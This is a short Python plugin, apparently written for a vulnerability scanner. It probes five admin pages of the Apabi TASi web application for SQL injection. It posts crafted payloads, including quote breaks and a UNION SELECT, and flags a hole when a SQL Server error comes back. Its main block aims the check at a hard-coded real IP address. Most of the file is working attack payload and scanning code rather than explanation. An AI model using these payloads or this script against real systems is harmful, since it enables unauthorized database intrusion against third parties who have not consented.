#!/usr/bin/python
#-*- encoding:utf-8 -*-
#__author__ = '1c3z'
#ref http://wooyun.org/bugs/wooyun-2010-0105887
#ref http://wooyun.org/bugs/wooyun-2010-0105892

def assign(service, arg):
    if service == "apabi_tasi":
        return True, arg


def audit(arg):
    import urllib2
    payloads = {'tasi/admin/system/tutordept.asp':'txtDeptName=aaa%27&did=0&action=add&page=0&btnNewSaveDept=%B1%A3%B4%E6',\
    'tasi/admin/system/language.asp':'editLangCode=-1%27%20union%20all%20select%201%20--&editLangName=SS&langid=&action=add&btnSaveLang=%B1%A3%B4%E6',\
    'tasi/admin/system/subject.asp':'editSClassCode=01&editSClassName=%D5%DC%D1%A7%27&dtype=1&scid=1&type=modify&btnSaveSClass=%B1%A3%B4%E6',\
    'tasi/admin/system/usermng.asp':'txtLogin=dd%27&txtPassword=dd&txtName=dd&cboUserType=0&txtDesc=dd&userid=0&oldlogin=&action=add&btnEditSaveUser=%B1%A3%B4%E6',\
    'tasi/admin/system/fileformat.asp':'txtFormatName=sss%27&txtFormatExt=sss&txtFormatVersion=sss&cboFileType=1&formatid=0&action=add&btnSaveFormat=%B1%A3%B4%E6'}
    for payload in payloads:
        url = arg + payload
        code, head,res, errcode, _ = curl.curl2(url,payloads[payload])
        if 'Microsoft OLE DB Provider for SQL Server' in res:
            security_hole(url)
                        
if __name__ == '__main__':
    from dummy import *
    audit(assign('apabi_tasi', 'http://202.120.121.200/')[1])